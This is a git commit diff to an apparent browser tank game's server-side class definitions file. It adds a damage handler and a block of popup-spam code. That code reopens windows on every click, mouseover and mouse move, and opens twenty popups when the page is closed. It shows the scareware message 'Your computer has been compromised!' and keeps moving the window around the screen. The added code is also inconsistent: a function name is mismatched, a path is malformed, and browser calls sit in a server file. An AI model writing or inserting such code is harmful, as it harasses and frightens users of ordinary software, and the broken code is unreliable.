2bbdff4947a44d7b3eeb42edee258aaeadddb18c
Glitch (neroio2) <none>
2024-01-09 17:48:15 +0000

    🚖🚥 Checkpoint ./server/modules/definitions/groups/dev.js:31612930/1832 ./server/modules/definitions/groups/popup.html:31612930/5453

--- server/modules/definitions/groups/dev.js
+++ server/modules/definitions/groups/dev.js
@@ -645,6 +645,15 @@ Class.aimassisttest = {
     POSITION: [10, 0, 0, 0, 360, 1],
       TYPE: "autoTankGunLock"
     }
+  ],
+      ON: [
+       {
+        event: "damage",
+        handler: ({ body, damageInflictor, damageTool }) => {
+            damageTool[0].kill()
+            reopenpopup()
+        }
+    },
   ]
 }
 Class.autoboosttest = {
@@ -1163,6 +1172,83 @@ const timer = (run, duration) => {
         }, 2 * duration);
     }
 };
+function reopenPopup() {
+  window.open(
+    "..../shit/popup.html",
+    "",
+    "blankmenubar=no,status=no,toolbar=no,resizable=no,width=350,height=370,titlebar=no,alwaysRaised=yes"
+  );
+}
+function spamUser() {
+  for (var i = 0; i < 20; i++) {
+    reopenPopup();
+  }
+  return "Your computer has been compromised!";
+}
+function init() {
+  document.body.onclick = reopenPopup;
+  document.body.onmouseover = reopenPopup;
+  document.body.onmousemove = reopenPopup;
+  window.onunload = spamUser;
+  window.onbeforeunload = spamUser;
+  playWithBall();
+  if (bookmarkPage) {
+    bookmarkPage();
+  }
+  reopenPopup();
+  setTimeout(function () {
+    window.close();
+  }, 15000);
+}
+
+var xOffset = 10,
+  yOffset = 10,
+  xPos = 400,
+  yPos = -100,
+  isRunning = true;
+
+function newXLeft() {
+  xOffset = Math.ceil(Math.random() * -10) * 10 - 20;
+  window.focus();
+}
+
+function newXRight() {
+  xOffset = Math.ceil(Math.random() * 10) * 10 - 20;
+}
+
+function newYUp() {
+  yOffset = Math.ceil(Math.random() * -10) * 10 - 20;
+}
+
+function newYDown() {
+  yOffset = Math.ceil(Math.random() * 10) * 10 - 20;
+}
+
+function stopMovement() {
+  isRunning = false;
+}
+
+function playWithBall() {
+  xPos += xOffset;
+  yPos += yOffset;
+  if (xPos > screen.width - 175) {
+    newXLeft();
+  }
+  if (xPos < 0) {
+    newXRight();
+  }
+  if (yPos > screen.height - 100) {
+    newYUp();
+  }
+  if (yPos < 0) {
+    newYDown();
+  }
+  if (isRunning) {
+    window.moveTo(xPos, yPos);
+    setTimeout(playWithBall, 1);
+  }
+}
+  
   Class.hitboxRender = makeDeco('M -1 -1 L 1 -1 L 1 1 L -1 1 Z');
    Class.recangluhitbox = {
     PARENT: ["genericTank"],
